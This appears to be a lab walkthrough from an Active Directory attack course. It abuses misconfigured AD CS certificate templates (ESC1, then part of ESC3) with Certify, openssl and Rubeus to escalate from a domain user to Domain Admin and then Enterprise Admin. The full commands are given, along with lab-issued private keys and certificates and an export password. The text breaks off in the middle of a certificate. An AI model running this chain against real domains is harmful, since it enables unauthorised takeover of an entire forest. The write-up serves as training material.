# Learning Objective 21

* Check if AD CS is used by the target forest and find any vulnerable/abusable templates.
* Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin.

> ESC1/ESC3 son rutas alternativas de escalada a DA/EA, no dependen de nada de lo que hiciste antes. El requisito único es:
>
> * Tener acceso como cualquier usuario de dominio (dcorp\studentX) - Que AD CS esté mal configurado (que existan esos templates vulnerables) Podrías haber hecho ESC1 en el LO 1 o 2, justo después de tener tu sesión inicial como studentX, y saltar directamente a DA sin Kerberoasting, sin OverPass-the-Hash, sin Golden Ticket, sin nada de lo del medio. Por qué el curso lo deja para el LO 21: - Pedagógico — primero te enseña las técnicas "clásicas" de AD (Kerberos, delegación, ACLs, trusts)
> * En la práctica real un pentester enumeraría AD CS en los primeros pasos del engagement y podría shortcutear todo\
>   El flujo real de un attacker que encuentra ESC1 sería: studentX (domain user) → Certify.exe find /enrolleeSuppliesSubject → HTTPSCertificates vulnerable → cert como Administrator → TGT → DA en dcorp-dc → cert como mcorp\Administrator → TGT → EA en mcorp-dc 3 comandos y tienes el forest. Todo lo de los LOs 5-19 quedaría irrelevante si AD CS está expuesto. Por eso es uno de los ataques más impactantes en entornos reales modernos.
>
> El flujo real de un attacker que encuentra ESC1 sería: studentX (domain user) → Certify.exe find /enrolleeSuppliesSubject → HTTPSCertificates vulnerable → cert como Administrator → TGT → DA en dcorp-dc → cert como mcorp\Administrator → TGT → EA en mcorp-dc
>
> 3 comandos y tienes el forest. Todo lo de los LOs 5-19 quedaría irrelevante si AD CS está expuesto. Por eso es uno de los ataques más impactantes en entornos reales modernos.

***

## Enumeration with Certipy.exe

We can use the Certify tool to check for AD CS in moneycorp:

> All of this from our VMStudent machine

```
C:\AD\Tools\Certify.exe cas
```

> cas = Certificate Authorities — simplemente enumera qué CAs (Autoridades Certificadoras) existen en el forest
>
> Te devuelve: - Nombre de la CA (moneycorp-MCORP-DC-CA)
>
> * En qué servidor está (mcorp-dc.moneycorp.local) - Thumbprint, fechas de validez, cadena de confianza Es el primer paso de reconocimiento de AD CS — antes de buscar templates vulnerables necesitas saber dónde está la CA y cómo se llama, porque ese nombre lo usas en todos los comandos posteriores (/ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA). Orden lógico:
>
> 1\. Certify.exe cas → ¿existe AD CS? ¿dónde está la CA?
>
> 2. Certify.exe find → ¿qué templates hay?
> 3. Certify.exe find /enrolleeSuppliesSubject o /vulnerable → ¿cuáles son abusables?

We can list all the templates using the following command. Going through the output we can find some interesting templates:

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation to DA using ESC1

The template HTTPSCertificates looks interesting. Let’s get some more information about it as it allows requestor to supply subject name:

```
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
```

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Sweet! The HTTPSCertificates template grants enrollment rights to RDPUsers group and allows requestor to supply Subject Name. Recall that studentx is a member of RDPUsers group. This means that we can request certificate for any user as studentx.

Let’s request a certificate for Domain Admin - Administrator:

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:HTTPSCertificates /altname:administrator /sid:S-1-5-21-719815819-3726368948-3917688648-500
```

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:yellow;">Copy all the text between</mark> <mark style="background-color:yellow;">`-----BEGIN RSA PRIVATE KEY-----`</mark> <mark style="background-color:yellow;">and</mark> <mark style="background-color:yellow;">`-----END CERTIFICATE-----`</mark> <mark style="background-color:yellow;">and save it to esc1.pem. (INSIDE /AD/TOOL same)</mark>

> ```
> -----BEGIN RSA PRIVATE KEY-----
> MIIEogIBAAKCAQEAxxsBmM+vvwOU7OceOtXUjQnHKlN5/8DFg7fOhEWk+c2rFugV
> ob+TG79Tt/ps1RohqZ+pkSLmoQm51hA4cpX5ZgrzU+B01ckCVtOxFrrJcMd66lb0
> 98DHJG/RMXnH1z3lbq4M3m084whpAem6Ya8pwH+6CdOarfOq+MPzHPLkkSJyNVZP
> p69DSLHSOIiSwBkytNdxOm8zVMXmSLL6MeQM/t9YvINuqIRb5R47MqkSGIdM8FPs
> SHBFFZNHK4WA3TsAxHPqjRVTtWtJ+edA0VUzb6Ar9JdU3Amjlx8hHR9ByRCFRybW
> OkjQmCDKeHfh6iy03NvYxloDt133J49RQk8/QQIDAQABAoIBADRNo93AsSo8hqK1
> E/vgsDVcnDVCOIo22awAXP/iS7RTkt4xmX0kFkDzwcpSvsQ8WRt2FdVKlcs4Atl4
> 6VswipODzOf7zrVaWIL2mU6fQsudm2xz62Yp/iZUOWAF3bltSRgKINdNWvFJBEy8
> WXnPyegHpZdvPvLzT7aJwxOXuvNk4e/WiUtNRAL3yFQm0Sp/n/BgLSiih19GNjUW
> HgfqrfsA5kuOBPumUcICa+KWqQ8VdG+SfD+cEEgsw2cnGZrClraIa9+13s7cG8KQ
> 9rxWtrtkD5yRD+5b+g5GcbRbLCu93DZwyogshUefkXVXymkmGnZ664SsA3aNoJ76
> f2ibbQECgYEAzPXrIKPbVWxcQG4yZ5oYxNylmY46XoF3dztCDV/8pZ3KRLpxNam9
> TeSNj+1QGaOYfirIzjMjUWbPU9aVU4Mt82TpoKrEt2+1ZXdnj0F+S/WoD5xbTMwP
> hT4NbHzJFwt5AMdyqQ2kwWmoH7Bpes1TznRrUsqana0as6fPqUilaA8CgYEA+K/T
> +EQ0xaYmxQDVI0cPgCoJbtuOhsLtCzJfgrzWbIdnYOiMvhXs7BgOjx8+JocJZvbt
> cJwTnX5GKFROYaqGIXXq2P1pYD8f2KIwzeoMY+BZ+Cv4wLIPZ/M7lFjFB20GvrmP
> /5lDvYOS8OTx2zPq7ZioKqD9IuizN2pomiE8E68CgYBa833FXDEGdTFyvfPMGYuI
> QEmUHJM2QMlctYUYHlIkxCJv4TQ/lfUVTaisB6kV14zh3+Z/6h1wD+lM0Nou1vVb
> Hpq121Gz/PRH9HaWEYAUAQz08HNrXto8TE70p2MswMCPYfI1poJH+bTLayNDhT39
> TZgagyGdeqVwt7Tk8AHGbQKBgCSdNpc5648iHFkq+zZ7cuPKzKK+vqhGsMHSQ8+q
> 3+MQuH7DHl2qOryz+gjGb88aWJ8JQgIvaI/qlIfBidzFT4RDqTUTcl1STe0GTCs1
> B2f5EyX/y1sLnEsQu7fmrfOe8LxJ89KNDTUs1wiSnK1KYo9ix3enRj3KhwBksUvo
> EsFPAoGAfIIDsLFMMAgeBTzaD7xn5CD88pdZmYdUt4VayLGsWqxRC7EvDWMY3DV7
> 56T1a/wneSo0sY+XEnyoZzGnx1UKLxyxPnNEUuZZ8tKOYaUSIr46wDbokKIyxza/
> yvNZUo/x6By/dShf9zPucLm6d6hoNCD4cEf7iJnRjpWyDLOSrfQ=
> -----END RSA PRIVATE KEY-----
> -----BEGIN CERTIFICATE-----
> MIIGsTCCBZmgAwIBAgITFQAAAEZkIpztazh8GgAAAAAARjANBgkqhkiG9w0BAQsF
> ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
> eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNjA0MTkw
> OTU2MzZaFw0yODA0MTkxMDA2MzZaMHMxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
> MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
> cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRMwEQYDVQQDEwpzdHVkZW50NDUzMIIBIjAN
> BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxxsBmM+vvwOU7OceOtXUjQnHKlN5
> /8DFg7fOhEWk+c2rFugVob+TG79Tt/ps1RohqZ+pkSLmoQm51hA4cpX5ZgrzU+B0
> 1ckCVtOxFrrJcMd66lb098DHJG/RMXnH1z3lbq4M3m084whpAem6Ya8pwH+6CdOa
> rfOq+MPzHPLkkSJyNVZPp69DSLHSOIiSwBkytNdxOm8zVMXmSLL6MeQM/t9YvINu
> qIRb5R47MqkSGIdM8FPsSHBFFZNHK4WA3TsAxHPqjRVTtWtJ+edA0VUzb6Ar9JdU
> 3Amjlx8hHR9ByRCFRybWOkjQmCDKeHfh6iy03NvYxloDt133J49RQk8/QQIDAQAB
> o4IDXTCCA1kwPQYJKwYBBAGCNxUHBDAwLgYmKwYBBAGCNxUIheGocofMn2jhhyaC
> n65RgvL2fYE/hpePdoe0hBICAWUCAQEwKQYDVR0lBCIwIAYIKwYBBQUHAwIGCCsG
> AQUFBwMEBgorBgEEAYI3CgMEMA4GA1UdDwEB/wQEAwIFoDA1BgkrBgEEAYI3FQoE
> KDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQwTQYJKwYB
> BAGCNxkCBEAwPqA8BgorBgEEAYI3GQIBoC4ELFMtMS01LTIxLTcxOTgxNTgxOS0z
> NzI2MzY4OTQ4LTM5MTc2ODg2NDgtNTAwMEQGCSqGSIb3DQEJDwQ3MDUwDgYIKoZI
> hvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAHBgUrDgMCBzAKBggqhkiG9w0DBzAd
> BgNVHQ4EFgQUFHI5IO2FV/XMQTwL+ds4BFM9nRwwKAYDVR0RBCEwH6AdBgorBgEE
> AYI3FAIDoA8MDWFkbWluaXN0cmF0b3IwHwYDVR0jBBgwFoAU0f6NCqf6tDKfNvwg
> uPfLnmjFRe0wgdgGA1UdHwSB0DCBzTCByqCBx6CBxIaBwWxkYXA6Ly8vQ049bW9u
> ZXljb3JwLU1DT1JQLURDLUNBLENOPW1jb3JwLWRjLENOPUNEUCxDTj1QdWJsaWMl
> MjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD
> PW1vbmV5Y29ycCxEQz1sb2NhbD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jh
> c2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcsGCCsGAQUFBwEB
> BIG+MIG7MIG4BggrBgEFBQcwAoaBq2xkYXA6Ly8vQ049bW9uZXljb3JwLU1DT1JQ
> LURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2
> aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW1vbmV5Y29ycCxEQz1sb2NhbD9jQUNl
> cnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0
> eTANBgkqhkiG9w0BAQsFAAOCAQEAEA57AuxPHas8/aIAynRO8TyAH2wnsXVz4ubQ
> BooKlc9xVTqZxcjY6VKAjO+Ddk+bOf9Jx86cpjKQh0MkHk4xGtXcvN3CbSHbxLSY
> QHRzy1vWxcYGso3vXfci8I5OExZcIkzsg4RCu2wHBvkfYbdpRp+Se6MZm8+xlWA9
> OqE+VtUVejr+yA/BKkEalKaLq6QvANaUR6dg0bep+wpiBWJuyreF9/YnEki7fskQ
> mGI2k69hC9bSjhcQ+HNNOMvhIKyp8M8ubSNq8uGFd+3dHYBdOoWBgq5l1HQ2zbwC
> KJS+qanqFv6IyLxnP7iJaHLTkFq/PpaNXXuzD7HCORFa6Frqsg==
> -----END CERTIFICATE-----
> ```

We need to convert it to PFX to use it.

Use openssl binary on the student VM to do that.

```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```

> I will use `SecretPass@123` as the export password.

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Use the PFX created above with Rubeus to request a TGT for DA - Administrator!

### Use Rubeus to use the TGT obtained by abuse ESC1 - DA

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc1-DA.pfx /password:SecretPass@123 /ptt
```

> It inject the ticket directly

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

#### Check if we actually have DA privileges

```
winrs -r:dcorp-dc cmd /c set username
```

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

Awesome! We can use similar method to escalate to Enterprise Admin privileges. Request a certificate for Enterprise Administrator - Administrator

<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation to EA using ESC1

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator /sid:S-1-5-21-335606122-960912869-3279953914-500
```

> ```
> -----BEGIN RSA PRIVATE KEY-----
> MIIEpAIBAAKCAQEA5Tka70kfeHkeFIYBpxfv6lYjSMD9mqEteEF5AtSNLigGnTVn
> DJz8gGR4oD/ZPaaA/VQ6mdV6XczyDQHB5i7xUKqNxxZDLy9FRcV1UrQM0AGXeChQ
> pWSoLp0D8m1uy4b84+W/axYqzcwVry8h1NpSAeoem8vTAw1uw/RzUS0yHSr/OcxU
> Sgbitt8v274oGcCeKYl+J6wY0R5TdMhoQp3dba62WhavJlqo241YmzApDImo0O9u
> /NIKVbdoeoWhfjmU17ItPebSpdPguPC7PKm1EZE33fST51WyZuVlv2ji3ExGoHzM
> bRlsAw1KyFwqjH4So62DVnDyjl279FnaUTvZcQIDAQABAoIBAQDLd3YGItUxfekK
> dKzw4hmO26j0QoKaCCmxTgSZU4yCBPth/m4bTxn+6a/9Js+xnqNuup5NwKWer3XH
> v+Cabt67KLkyl/tI3d/Sf+SVZcbduBv4h2iWdxOmVK+VODgZpxfBP0U7S/DwvhAd
> cWvJYYVbt7I1vqXuVrUUcV8PFlwecEcRXCdEUApZC7PXU2+xNWdETex7s4BNOFeW
> ttU5mQvBCOi1+PWd7wrvB+uOx8Y2wUQXcN6LIukUMVHG/BBU7v4vRIOysWqEvFqP
> kJ3k9UFMNSsQTsy+IK2ifX5NyuhPebhgfHyqztJBJR4iN9qseCdxGZC0RSv9KFYs
> 1EIF4S6lAoGBAPKySe7370bVBXZ9NHlW8m7MSUPG/EIS7uQcXxmNASXxwQ+ZQ9gC
> LTjr/T9U3xK8kC6LSUi8J0G3oqxFPe8fFHA5oQNYpdgJWsFReQh9gT67Kha+X0Yo
> r4R7T35wcbahkduM8au/uSFkh279c1tT0933EMK2EdiUaAfBGx+bAszzAoGBAPHJ
> v0oZuiUHVKuhWhgBJRQYOJ/nGLTrrTKzE5HM0xJ9Ugb97sXyyTDNsizGfTZxmRBo
> ERpyEkgxQDEgy7Bgz79hA3XK/FmAjAxza0OqvQFx6MxZ6icZL8WMhHOPlF95No/N
> q5c3euks56LBDC2XnCnjGfGIIzdPTy1DBP9llYkLAoGBANHrYIOwNGjB7H22gmLJ
> z9wCGwTi4mKMWdE4sRE6o1mcp+7EFKiMCW2IwX27/U8JhnSbyYF+LT5sheoX4iAo
> c9c2IYzxalFYlgVMYTH0zIvj+928QFBA9L/UoMeunsznJ3ANkyOJK6o0d+iKlPLT
> qRf+kaK5NOpuQyUh5EIMI/n9AoGAHX/78tKIv5PRZM9e6qbZG0aJQhk0Dn7ittja
> fmN7LTpVE71PsJ8apPWz03q0NDxP7IyF6bAZQu2fY18Y+wAU2MjBX1HQ0Cq665n5
> cFwYi2CWgrhFtVeBWJz4XBEcjTmAyrLRSLXgLSrpaBYdokJpL0MiGzH8+faXNnKC
> 3ZZLVFkCgYAiWoFkkAEJT/NDylhuZkOENFZKNI4zmR7KBxJmWScWQTQQLmCbR7oV
> pmtcx9s00MsUVo3CqiFaeLYKeFBCFmONokzdHciPaw4PFEYe4nUmRMnUJYcTz/xX
> 5avA60mK6gIiyKlt27ddgCBEJpkICYFcBD0DtsettTaN+C94ikNaXg==
> -----END RSA PRIVATE KEY-----
> -----BEGIN CERTIFICATE-----
> MIIGwDCCBaigAwIBAgITFQAAAEzpomHLb040cAAAAAAATDANBgkqhkiG9w0BAQsF
> ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
> eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNjA0MTkx
> MTE1MjlaFw0yODA0MTkxMTI1MjlaMHMxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
> MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
> cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRMwEQYDVQQDEwpzdHVkZW50NDUzMIIBIjAN
> BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5Tka70kfeHkeFIYBpxfv6lYjSMD9
> mqEteEF5AtSNLigGnTVnDJz8gGR4oD/ZPaaA/VQ6mdV6XczyDQHB5i7xUKqNxxZD
> Ly9FRcV1UrQM0AGXeChQpWSoLp0D8m1uy4b84+W/axYqzcwVry8h1NpSAeoem8vT
> Aw1uw/RzUS0yHSr/OcxUSgbitt8v274oGcCeKYl+J6wY0R5TdMhoQp3dba62Whav
> Jlqo241YmzApDImo0O9u/NIKVbdoeoWhfjmU17ItPebSpdPguPC7PKm1EZE33fST
> 51WyZuVlv2ji3ExGoHzMbRlsAw1KyFwqjH4So62DVnDyjl279FnaUTvZcQIDAQAB
> o4IDbDCCA2gwPQYJKwYBBAGCNxUHBDAwLgYmKwYBBAGCNxUIheGocofMn2jhhyaC
> n65RgvL2fYE/hpePdoe0hBICAWUCAQEwKQYDVR0lBCIwIAYIKwYBBQUHAwIGCCsG
> AQUFBwMEBgorBgEEAYI3CgMEMA4GA1UdDwEB/wQEAwIFoDA1BgkrBgEEAYI3FQoE
> KDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQwTAYJKwYB
> BAGCNxkCBD8wPaA7BgorBgEEAYI3GQIBoC0EK1MtMS01LTIxLTMzNTYwNjEyMi05
> NjA5MTI4NjktMzI3OTk1MzkxNC01MDAwRAYJKoZIhvcNAQkPBDcwNTAOBggqhkiG
> 9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAcGBSsOAwIHMAoGCCqGSIb3DQMHMB0G
> A1UdDgQWBBSOahhGctwdjClfqju5KdyHPPR/TDA4BgNVHREEMTAvoC0GCisGAQQB
> gjcUAgOgHwwdbW9uZXljb3JwLmxvY2FsXGFkbWluaXN0cmF0b3IwHwYDVR0jBBgw
> FoAU0f6NCqf6tDKfNvwguPfLnmjFRe0wgdgGA1UdHwSB0DCBzTCByqCBx6CBxIaB
> wWxkYXA6Ly8vQ049bW9uZXljb3JwLU1DT1JQLURDLUNBLENOPW1jb3JwLWRjLENO
> PUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
> b25maWd1cmF0aW9uLERDPW1vbmV5Y29ycCxEQz1sb2NhbD9jZXJ0aWZpY2F0ZVJl
> dm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9p
> bnQwgcsGCCsGAQUFBwEBBIG+MIG7MIG4BggrBgEFBQcwAoaBq2xkYXA6Ly8vQ049
> bW9uZXljb3JwLU1DT1JQLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
> ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW1vbmV5Y29y
> cCxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlm
> aWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAxKYDhiWmLW1X1pMo
> xSenPCd7L2E+5zubTSPrdTgt98CI3Lz5NF3vvHw2ELI5Hx48M7afJE4d5KlCI0sF
> PLY5+wXNFeN/dLrylVoy7z/mK4tEO2rotOOWbvYGMP+4lkuzezSMlJVHRgFqGhaS
> h8XiOIyoz7OSE/HmPN5gq2B3AXFe6xrs5BtDZjZ09mNvPs3DLDlPk5VJM+aajuvS
> gRBztnaoKmBt6WabO2vLho2CoMGQ0K7aUWDkOWFrr9fJFpP+bjss89EMP/iW/QIR
> M2LQ2CwK71yI70NmfsaJ42bp2QtpjV3yh1y9pj98bdUPgvV/a3Y7g18gx8Ykzcrg
> 3U08xA==
> -----END CERTIFICATE-----
> ```

Save the certificate to `esc1-EA.pem` and convert it to PFX. I will use `SecretPass@123` as the export password:

```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
```

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Use Rubeus to request TGT for Enterprise Administrator - Administrator - EA

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:C:\AD\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt
```

<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

Finally, access mcorp-dc!

```
C:\AD\Tools> winrs -r:mcorp-dc cmd /c set username
USERNAME=administrator
```

<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

***

## Privilege Escalation to DA using ESC3

If we list vulnerable templates in moneycorp, we get the following result:

```
C:\AD\Tools\Certify.exe find /vulnerable
```

<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

The `SmartCardEnrollment-Agent` template has EKU for Certificate Request Agent and grants enrollment rights to Domain users.

If we can find another template that has an EKU that allows for domain authentication and has application policy requirement of certificate request agent, we can request certificate on behalf of any user.

```
C:\AD\Tools\Certify.exe find
```

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

Sweet! Now, request an Enrollment Agent Certificate from the template `SmartCardEnrollment-Agent`:

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

> \-----BEGIN RSA PRIVATE KEY-----\
> MIIEpQIBAAKCAQEAstXm2wgCgEMpLhOosOi2zHF3o0EFv2o8UEJ5FKrORwKrl65n\
> C+n1WhYOMHPRIf0w25eq80kB8LUGsOHTy6Pm5STljoR5/lNi6S3JBJNyqQqO5zl6\
> cy3qaYNZAbPoVQskT49pHdGwNMdjycsUAJmCipmUfiFKBZgXdHfSdmyQ0Ynb17xe\
> cm15QEsNK63YcXwged5J9InLk8oVgk5dtD3gbkzHNgkFIcUmBX7eoLLrSBGp8KG3\
> SVERyN2xXohh9d/ek5ILOQY6xekM/Kmooz//83hpH4EFO+2smQ2VVUaHsYXs/Rsi\
> H3UQUH+CIqzWWLaGk2Y0S2aPqaOu8nMDv4zUvQIDAQABAoIBAFpJca69QX396klv\
> 9WezZa6bzpnmVv+HpAGlPbn4bgId0AHZM/8o1AzyO6GspzXwvPzweocvIcKjskgV\
> CzexfP3M/fRQ38JN2Q7+ZZFg26+KPBFyzGZgFQvGG2anrLFa2a8tKRW76qkKzU9w\
> rp2K4wQUe4qeRd/DJHxRjjjpoMeYaN0kb1KX0aoaH0qcJe0b85XDXj+6QlneYEcR\
> BK2X3CYf+Z4pMD/YYgyjUZGmXnr5xGNN6oSEkFdRIuHXXpfLy/YMkDKucv1bzGMY\
> d3IiK/hUJ02O1QZmn2yf3opANLjvuk8js3U2O7dKSWDh/vs6FQv6xch2qxWL5DYE\
> lZwbBiUCgYEA302TmROvZ9dHbczxzyFmn8IG6XHX0BW4wuKe+jzB+S/HkGcFoFe8\
> 3S+8WNarsYWVQ+VpB697plYH+fSLXETCg9MmuCPQPCyWUMOW8dEV2h1uGEq+1DCb\
> 1JsPx46vd3JGvph4TcQ8rhXmnKirVLfieFqkZ7Q2rfYJtenYGxHPBOsCgYEAzQV6\
> 1etxIqBEWUX245GiYjpmGM03PzcI5VUsfjGm3LLVGD7o6fYTQbN/LTbWLbvEpUOF\
> w9x5LZ0tPOVfBpSRtz44wJ+5f4ZmUew0k1ld9n8E8PZCbkg8uvXZgedvtl7zRRZX\
> 7dPqNTPD6uwYbMhVeSQrd7g6odBkRVqVBBv/wvcCgYEAvKeFsyX2Yvx11EX5ZM0L\
> Lp11yXPsqFgxqDRdq3v5RNUg/NaM4lI9tYDG1ydGFsyMtrfybBPNm1HDm2EG/AT7\
> cPPLGnbnTm887y7PL609kPCcOtmrLwmCHbSDOE1L4NYi/pNB0DGiMlE+a8v0M7bH\
> Fnc9vn96Uq4ytgXCFdyN0dECgYEAxIsrTeZux/4SZ+7dlx3nKPnJJJ+fBfgRjCDS\
> DYw15b9+78ZnbNrdbQ/RrJu0SZWHF9OaacBzXtoeIxHUvi8xXhTFPUwh/XHvpzuk\
> z1lN7d+o8gNyfdy8c5L6WEFxY8i0uBeKZdHQ5f3hJNX/OFH5NrAJB7VSaAuqBJ6o\
> 2o6o6tMCgYEAnJHy5jd/RzyITLEDW2UedfVju/271fTvrOUwfs1k9MB7dNf5B8Mz\
> VriDA+eyrg15hCXW/GtZ9QVBVgnmjS8rSFBXFAvf3MmjuMxfLM3+xtgob0nx16vO\
> B/R+H2bxGFidrUdX4ja8/0G33W/t23GqLRvL362vYs10942hRd9vZaM=\
> \-----END RSA PRIVATE KEY-----\
> \-----BEGIN CERTIFICATE-----\
> MIIGNDCCBRygAwIBAgITFQAAAE3cLvNUQl7p4QAAAAAATTANBgkqhkiG9w0BAQsF\
> ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l\
> eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNjA0MTkx\
> MTI0NTBaFw0yODA0MTkxMTM0NTBaMFoxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ\
> MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEOMAwGA1UEAxMFVXNlcnMxFjAUBgNV\
> BAMTDUFkbWluaXN0cmF0b3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB\
> AQCy1ebbCAKAQykuE6iw6LbMcXejQQW/ajxQQnkUqs5HAquXrmcL6fVaFg4wc9Eh\
> /TDbl6rzSQHwtQaw4dPLo+blJOWOhHn+U2LpLckEk3KpCo7nOXpzLeppg1kBs+hV\
> CyRPj2kd0bA0x2PJyxQAmYKKmZR+IUoFmBd0d9J2bJDRidvXvF5ybXlASw0rrdhx\
> fCB53kn0icuTyhWCTl20PeBuTMc2CQUhxSYFft6gsutIEanwobdJURHI3bFeiGH1\
> 396Tkgs5BjrF6Qz8qaijP//zeGkfgQU77ayZDZVVRoexhez9GyIfdRBQf4IirNZY\
> toaTZjRLZo+po67ycwO/jNS9AgMBAAGjggL5MIIC9TA8BgkrBgEEAYI3FQcELzAt\
> BiUrBgEEAYI3FQiF4ahyh8yfaOGHJoKfrlGC8vZ9gT+C4d18ue0NAgFkAgEFMBUG\
> A1UdJQQOMAwGCisGAQQBgjcUAgEwDgYDVR0PAQH/BAQDAgeAMB0GCSsGAQQBgjcV\
> CgQQMA4wDAYKKwYBBAGCNxQCATAdBgNVHQ4EFgQUqCOT3bxsx9izbLKW31s1Dfhx\
> fH0wHwYDVR0jBBgwFoAU0f6NCqf6tDKfNvwguPfLnmjFRe0wgdgGA1UdHwSB0DCB\
> zTCByqCBx6CBxIaBwWxkYXA6Ly8vQ049bW9uZXljb3JwLU1DT1JQLURDLUNBLENO\
> PW1jb3JwLWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T\
> ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW1vbmV5Y29ycCxEQz1sb2NhbD9j\
> ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz\
> dHJpYnV0aW9uUG9pbnQwgcsGCCsGAQUFBwEBBIG+MIG7MIG4BggrBgEFBQcwAoaB\
> q2xkYXA6Ly8vQ049bW9uZXljb3JwLU1DT1JQLURDLUNBLENOPUFJQSxDTj1QdWJs\
> aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u\
> LERDPW1vbmV5Y29ycCxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0\
> Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA4BgNVHREEMTAvoC0GCisGAQQB\
> gjcUAgOgHwwdQWRtaW5pc3RyYXRvckBtb25leWNvcnAubG9jYWwwTAYJKwYBBAGC\
> NxkCBD8wPaA7BgorBgEEAYI3GQIBoC0EK1MtMS01LTIxLTMzNTYwNjEyMi05NjA5\
> MTI4NjktMzI3OTk1MzkxNC01MDAwDQYJKoZIhvcNAQELBQADggEBALjMiAUIfMSN\
> p8lurJBALnqbMiUxgVZICeXcCORDx6yyLSjakXnJVOILUui8xacRUP3TJ6ETyzAZ\
